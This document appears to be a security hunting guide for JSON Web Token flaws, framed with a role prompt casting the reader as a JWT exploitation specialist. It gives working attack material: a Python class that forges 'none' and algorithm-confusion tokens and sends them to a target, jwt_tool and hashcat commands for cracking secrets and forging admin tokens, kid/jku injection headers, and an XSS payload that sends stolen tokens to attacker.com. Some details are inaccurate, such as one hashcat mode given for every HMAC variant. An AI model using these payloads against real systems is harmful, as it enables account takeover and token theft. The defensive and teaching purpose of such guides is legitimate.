# JSON Web Token (JWT) Vulnerabilities - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are a leading JWT security specialist with deep expertise in token-based authentication vulnerabilities. Your mission is to identify, exploit, and prevent JWT security flaws that can lead to authentication bypass, privilege escalation, and full account compromise. You understand the intricate details of JWT structure, cryptographic algorithms, and the subtle vulnerabilities that arise from improper implementation. You possess mastery over tools like jwt_tool, JWT.io, and custom exploitation scripts. Your goal is to chain JWT vulnerabilities with other attack vectors to achieve maximum impact, from unauthorized access to complete system compromise. You approach every target with methodical precision, analyzing token generation, validation, and lifecycle management to uncover hidden flaws that automated scanners miss.

## Core Concepts Deep Dive

### JWT Structure Analysis

A JWT consists of three Base64URL-encoded parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header (Typical):**
```json
{
  "alg": "HS256",  // Algorithm
  "typ": "JWT",    // Type
  "kid": "key-id"  // Key ID (optional)
}
```

**Payload (Claims):**
```json
{
  "sub": "1234567890",     // Subject
  "name": "John Doe",      // Name
  "iat": 1516239022,       // Issued At
  "exp": 1516242622,       // Expiration
  "admin": false,          // Custom claim
  "role": "user"           // Role claim
}
```

**Signature:**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### Algorithm Confusion Attacks

**RS256 to HS256 Attack:**
- RS256 uses asymmetric keys (private/public)
- HS256 uses symmetric keys (shared secret)
- If server expects RS256 but accepts HS256, attacker can sign with public key

**Attack Flow:**
```
1. Obtain the public key (often in JWKS endpoint)
2. Change header alg from RS256 to HS256
3. Sign token using public key as HS256 secret
4. Server validates with public key (thinking it's HMAC secret)
5. Token is accepted as valid
```

**none Algorithm Attack:**
```
1. Set header algorithm to "none"
2. Remove signature entirely
3. Server may accept token without verification
4. Complete authentication bypass
```

### JWT Claim Manipulation

**Privilege Escalation Patterns:**
```json
// Original
{"sub": "user123", "role": "user", "admin": false}

// Modified
{"sub": "user123", "role": "admin", "admin": true}
```

**Token Confusion:**
- Using access token as refresh token
- Cross-origin token reuse
- Token scope escalation

## Pre-requisite Knowledge

- Understanding of cryptographic concepts (HMAC, RSA, ECDSA)
- Knowledge of HTTP authentication mechanisms
- Familiarity with OAuth 2.0 and OpenID Connect
- Understanding of Base64URL encoding
- Knowledge of web application session management
- Familiarity with common web frameworks (Express, Django, Flask, Spring)
- Understanding of key management and distribution

## Step-by-Step Hunting Methodology

### Phase 1: JWT Discovery and Analysis

**Step 1: Locate JWT Tokens**
```
- HTTP Authorization header: Bearer <token>
- Cookies: session=<token>
- URL parameters: ?token=<token>
- Local storage: localStorage.getItem('token')
- Response bodies: {"access_token": "..."}
```

**Step 2: Decode and Analyze**
```bash
# Using jwt.io
# Paste token, inspect header and payload

# Using jq
echo "eyJ..." | base64 -d | jq .

# Using Python
python3 -c "import jwt; print(jwt.decode('eyJ...', options={'verify_signature': False}))"
```

**Step 3: Map Token Properties**
```
- Algorithm (alg)
- Issuer (iss)
- Audience (aud)
- Expiration (exp)
- Not Before (nbf)
- Issued At (iat)
- Token ID (jti)
- Custom claims (role, admin, permissions)
```

### Phase 2: Vulnerability Testing

**Test 1: Algorithm Confusion**
```bash
# Using jwt_tool
python3 jwt_tool.py <token> -X k -pk public_key.pem

# Manual test
# Change header: {"alg":"HS256","typ":"JWT"}
# Sign with public key as secret
```

**Test 2: none Algorithm**
```bash
# Using jwt_tool
python3 jwt_tool.py <token> -X a

# Manual test
# Change header: {"alg":"none","typ":"JWT"}
# Remove signature (keep trailing dot)
```

**Test 3: Weak Secret Cracking**
```bash
# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Using jwt_tool
python3 jwt_tool.py <token> -C -d wordlist.txt

# Online tools
# https://jwt.io/#debugger
```

**Test 4: Claim Manipulation**
```bash
# Change role claim
python3 jwt_tool.py <token> -X r -pc role -pv admin

# Change admin claim
python3 jwt_tool.py <token> -X r -pc admin -pv true
```

**Test 5: Key Injection (JWKS)**
```bash
# If JWKS endpoint is accessible
curl https://target.com/.well-known/jwks.json

# Inject your own key
python3 jwt_tool.py <token> -X i -ji your_jwks.json
```

### Phase 3: Exploitation Chain

```
1. Identify JWT usage and storage
2. Analyze token structure and claims
3. Test algorithm handling
4. Attempt secret recovery/cracking
5. Manipulate claims for privilege escalation
6. Test token lifecycle (expiration, refresh)
7. Chain with other vulnerabilities
8. Document all findings with PoC
```

## Tool Arsenal with Exact Commands

### jwt_tool (Primary Tool)

```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install -r requirements.txt

# Scan for vulnerabilities
python3 jwt_tool.py <token>

# Change algorithm
python3 jwt_tool.py <token> -X a  # none algorithm
python3 jwt_tool.py <token> -X k  # key confusion

# Manipulate claims
python3 jwt_tool.py <token> -X r -pc role -pv admin
python3 jwt_tool.py <token> -X r -pc admin -pv true

# Crack weak secrets
python3 jwt_tool.py <token> -C -d /path/to/wordlist.txt

# Inject JWKS
python3 jwt_tool.py <token> -X i -ji /path/to/your_jwks.json

# Generate new token
python3 jwt_tool.py -n <template_token> -X r -pc role -pv admin -S hs256 -s your_secret
```

### Hashcat for JWT Cracking

```bash
# Extract JWT for cracking
echo "eyJ..." > jwt.txt

# Crack HS256
hashcat -m 16500 jwt.txt wordlist.txt

# Crack HS384
hashcat -m 16500 jwt.txt wordlist.txt

# Crack HS512
hashcat -m 16500 jwt.txt wordlist.txt

# Use rules
hashcat -m 16500 jwt.txt wordlist.txt -r rules/best64.rule
```

### Custom JWT Exploitation Script

```python
#!/usr/bin/env python3
import requests
import jwt
import json
import base64
import hashlib
import hmac
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

class JWTExploiter:
    def __init__(self, token, target_url):
        self.token = token
        self.target_url = target_url
        self.header = self.decode_header()
        self.payload = self.decode_payload()
    
    def decode_header(self):
        try:
            return jwt.get_unverified_header(self.token)
        except:
            return {}
    
    def decode_payload(self):
        try:
            return jwt.decode(self.token, options={"verify_signature": False})
        except:
            return {}
    
    def test_none_algorithm(self):
        """Test if server accepts 'none' algorithm"""
        header = self.header.copy()
        header['alg'] = 'none'
        
        new_payload = self.payload.copy()
        new_payload['admin'] = True
        
        token = self.create_token(header, new_payload, signature="")
        return self.send_token(token)
    
    def test_algorithm_confusion(self, public_key_path):
        """RS256 to HS256 confusion attack"""
        with open(public_key_path, 'rb') as f:
            public_key = f.read()
        
        header = self.header.copy()
        header['alg'] = 'HS256'
        
        signature = hmac.new(
            public_key,
            self.base64_url_encode(json.dumps(header)) + '.' + self.base64_url_encode(json.dumps(self.payload)),
            hashlib.sha256
        ).digest()
        
        token = self.base64_url_encode(json.dumps(header)) + '.' + self.base64_url_encode(json.dumps(self.payload)) + '.' + self.base64_url_encode(signature)
        return self.send_token(token)
    
    def test_weak_secret(self, wordlist):
        """Test for weak secrets"""
        with open(wordlist, 'r') as f:
            for line in f:
                secret = line.strip()
                try:
                    jwt.decode(self.token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    return {"status": "found", "secret": secret}
                except:
                    continue
        return {"status": "not_found"}
    
    def create_token(self, header, payload, signature):
        """Create a new JWT token"""
        header_b64 = self.base64_url_encode(json.dumps(header))
        payload_b64 = self.base64_url_encode(json.dumps(payload))
        return f"{header_b64}.{payload_b64}.{signature}"
    
    def base64_url_encode(self, data):
        """Base64URL encode data"""
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    def send_token(self, token):
        """Send token to target and check response"""
        headers = {"Authorization": f"Bearer {token}"}
        try:
            response = requests.get(self.target_url, headers=headers)
            return {"status_code": response.status_code, "response": response.text[:500]}
        except Exception as e:
            return {"error": str(e)}

# Usage
exploiter = JWTExploiter("eyJ...", "https://target.com/dashboard")
print("None algorithm:", exploiter.test_none_algorithm())
```

### Burp Suite Extensions

```
# JWT Editor
- Install from BApp Store
- Decode JWT tokens
- Modify claims
- Test algorithm attacks
- Generate new keys

# AuthMatrix
- Test authorization
- Map JWT roles
- Identify privilege escalation
```

## Real-World Case Studies

### Case Study 1: Algorithm Confusion Leading to Account Takeover

**Scenario:** A web application uses RS256 for JWT signing with a public JWKS endpoint.

**Discovery:**
```bash
# Step 1: Obtain JWKS
curl https://target.com/.well-known/jwks.json
# Returns public RSA key

# Step 2: Analyze token
python3 jwt_tool.py eyJ...
# Header shows RS256

# Step 3: Test algorithm confusion
python3 jwt_tool.py eyJ... -X k -pk public_key.pem
# Server returns 200 OK - VULNERABLE!

# Step 4: Exploit
python3 jwt_tool.py eyJ... -X k -pk public_key.pem -X r -pc role -pv admin
# Full admin access
```

**Impact:** Complete account takeover of any user, including administrators.

### Case Study 2: Weak Secret Cracking

**Scenario:** An API uses HS256 with a weak secret.

**Discovery:**
```bash
# Step 1: Extract token
Token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiandvbiIsInJvbGUiOiJ1c2VyIn0.abc123

# Step 2: Test common secrets
# Try: secret, password, 123456, etc.

# Step 3: Use hashcat
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiandvbiIsInJvbGUiOiJ1c2VyIn0.abc123" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Found: "supersecret123"

# Step 4: Forge admin token
python3 jwt_tool.py eyJ... -S hs256 -s supersecret123 -X r -pc role -pv admin
```

### Case Study 3: JWT in Client-Side Storage

**Scenario:** Application stores JWT in localStorage, vulnerable to XSS.

**Discovery:**
```javascript
// Found XSS vulnerability
// Token stored in localStorage
const token = localStorage.getItem('jwt');

// Exfiltrate token
fetch('https://attacker.com/steal?token=' + token);
```

**Exploitation:**
```python
# Step 1: XSS to steal JWT
<script>
fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'))
</script>

# Step 2: Use stolen token
curl -H "Authorization: Bearer <stolen_token>" https://target.com/api/admin
```

### Case Study 4: JWT Refresh Token Abuse

**Scenario:** Refresh tokens have no expiration and can be reused.

**Discovery:**
```bash
# Step 1: Obtain refresh token
POST /api/auth/login
{"username": "user", "password": "pass"}
# Response includes refresh_token

# Step 2: Use refresh token multiple times
POST /api/auth/refresh
{"refresh_token": "abc123"}
# Returns new access token

# Step 3: Token still valid after use
POST /api/auth/refresh
{"refresh_token": "abc123"}
# Still works!
```

## Advanced Techniques and Bypass

### JWT Header Injection

**Kid Parameter Injection:**
```json
// Original header
{"alg": "RS256", "kid": "key1"}

// Injected header
{"alg": "RS256", "kid": "/dev/null"}
// Points to null device, signature always valid

// Or path traversal
{"alg": "RS256", "kid": "../../../dev/null"}
```

**Jku Header Injection:**
```json
// Original header
{"alg": "RS256", "jku": "https://target.com/keys"}

// Injected header
{"alg": "RS256", "jku": "https://attacker.com/keys"}
// Server fetches attacker's key
```

### JWT Lifetime Bypass

**Modification Techniques:**
```json
// Remove expiration
{"sub": "user123", "iat": 1516239022}
// No exp claim

// Extend expiration
{"sub": "user123", "exp": 9999999999}

// Modify nbf (not before)
{"sub": "user123", "nbf": 0}
```

### JWT Scope Escalation

**Claim Manipulation:**
```json
// Original
{"sub": "user123", "scope": "read"}

// Escalated
{"sub": "user123", "scope": "read write admin"}

// Or add permissions
{"sub": "user123", "permissions": ["read", "write", "admin", "delete"]}
```

## Detection and Indicators

### Server-Side Indicators

```
# Algorithm confusion attempt logged
[WARN] JWT algorithm mismatch: expected RS256, got HS256

# none algorithm attempt
[WARN] JWT algorithm 'none' not allowed

# Invalid signature
[ERROR] JWT signature verification failed
```

### Client-Side Indicators

```javascript
// JWT in localStorage (XSS vulnerable)
localStorage.getItem('jwt')

// JWT in URL (referrer leakage)
https://target.com/dashboard?token=eyJ...

// JWT in cookie without HttpOnly
document.cookie  // Shows JWT
```

### Log Analysis Patterns

```bash
# Search for JWT patterns in logs
grep -E "eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*" access.log

# Search for algorithm changes
grep "alg" access.log | grep -i "none\|HS256"
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Full authentication bypass | none algorithm accepted |
| High | Privilege escalation | User becomes admin |
| High | Account takeover | Forging tokens for any user |
| Medium | Information disclosure | Reading sensitive claims |
| Low | Session fixation | Reusing expired tokens |

## Common Pitfalls

1. **Not testing all algorithms** - RS256, HS256, HS384, HS512, ES256
2. **Ignoring key material** - Public keys, JWKS endpoints
3. **Overlooking claim manipulation** - Custom claims for authorization
4. **Not testing token lifecycle** - Expiration, refresh, revocation
5. **Assuming signature verification** - Server may skip verification
6. **Ignoring storage location** - localStorage vs HttpOnly cookies
7. **Not testing cross-origin** - CORS misconfigurations with JWT
8. **Forgetting about key rotation** - Old keys may still work
9. **Not testing JWKS injection** - Custom keys
10. **Ignoring token scope** - Different tokens for different APIs

## Integration with Other Hunting Areas

- **XSS**: Steal JWT from localStorage
- **CSRF**: Cross-site request forgery with JWT
- **IDOR**: Use JWT to access unauthorized resources
- **Authentication Bypass**: Complete auth bypass via JWT flaws
- **Privilege Escalation**: Modify JWT claims
- **Session Management**: JWT as session token
- **API Security**: JWT in API authentication
- **OAuth/OIDC**: JWT in OAuth flows

## Reporting Template

```
## Vulnerability: JWT Security Flaw

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Token Location: [header/cookie/storage]

### JWT Analysis
- Algorithm: [RS256/HS256/etc]
- Claims: [relevant claims]
- Expiration: [yes/no/weak]

### Vulnerability Details
- Type: [algorithm confusion/weak secret/claim manipulation/etc]
- Reproduction Steps: [step-by-step]

### Proof of Concept
[Token manipulation example]

### Impact
[Detailed impact analysis]

### Remediation
- Use strong algorithms (RS256/ES256)
- Validate all claims (exp, iss, aud)
- Use HttpOnly secure cookies
- Implement token rotation
- Use JWKS with proper validation

### References
- CWE-347: Improper Verification of Cryptographic Signature
- RFC 7519: JSON Web Token
- OWASP: JSON Web Token Best Practices
```

## Practice Labs

### JWT Vulnerable Apps

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# JWT authentication bypass challenges
```

**JWT.io:**
- https://jwt.io
- Interactive JWT debugger
- Test your own tokens

**PortSwigger JWT Labs:**
- https://portswigger.net/web-security/jwt
- Free hands-on labs

**HackTheBox JWT Challenges:**
- Various JWT exploitation scenarios
- Real-world difficulty

### Practice Commands

```bash
# Decode JWT
echo "eyJ..." | base64 -d | jq .

# Generate test JWT
python3 -c "import jwt; print(jwt.encode({'sub': '123'}, 'secret', algorithm='HS256'))"

# Test none algorithm
python3 -c "
import jwt
payload = {'sub': '123', 'admin': True}
token = jwt.encode(payload, '', algorithm='none')
print(token)
"
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not forge tokens for unauthorized access**
3. **Report all findings to the system owner**
4. **Do not exfiltrate data you don't own**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### JWT Testing Checklist

```
[ ] Locate all JWT tokens
[ ] Decode and analyze token structure
[ ] Test algorithm handling
[ ] Test none algorithm
[ ] Test algorithm confusion
[ ] Attempt secret cracking
[ ] Manipulate claims
[ ] Test JWKS injection
[ ] Test token lifetime
[ ] Test refresh token security
[ ] Chain with other vulnerabilities
[ ] Document all findings
```

### Common JWT Payloads

**Admin Token:**
```json
{"sub": "admin", "role": "admin", "admin": true, "exp": 9999999999}
```

**none Algorithm:**
```json
{"alg": "none", "typ": "JWT"}
```

**HS256 with Weak Secret:**
```bash
python3 jwt_tool.py <token> -S hs256 -s secret123
```

### Quick Commands

```bash
# Decode JWT
echo "eyJ..." | base64 -d

# Test with jwt_tool
python3 jwt_tool.py <token> -X a  # none
python3 jwt_tool.py <token> -X k  # key confusion

# Crack with hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Generate new token
python3 jwt_tool.py -n <token> -X r -pc role -pv admin -S hs256 -s secret
```

### JWT Security Best Practices

```
1. Use RS256 or ES256 (asymmetric algorithms)
2. Validate all claims (exp, iss, aud, nbf)
3. Use HttpOnly, Secure cookies
4. Implement token rotation
5. Use JWKS with proper validation
6. Never store tokens in localStorage
7. Use short expiration times
8. Implement token revocation
9. Use strong secrets (if using HS256)
10. Monitor for token anomalies
```
